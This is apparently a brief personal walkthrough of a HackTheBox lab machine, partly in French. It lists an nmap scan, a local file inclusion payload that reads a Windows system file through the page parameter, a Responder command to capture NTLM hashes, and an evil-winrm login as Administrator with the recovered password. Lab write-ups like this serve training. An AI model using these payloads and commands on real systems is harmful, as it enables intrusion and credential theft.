#HackTheBox #linux 
## Scan
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1

## Modifier le nom de l'@ip par unika.htb dans /etc/hosts

## unika.htb/?page=french.html

## inclusion de fichier LFI
#ExploitLFI
unika.htb/?page=C:/WINDOWS/System32/drivers/etc/hosts


## trouver les identifiants NTLM
responder -I tun0

## Connexion powershell
evil-winrm -i 10.129.188.16 -u Administrator -p badminton

# flag : 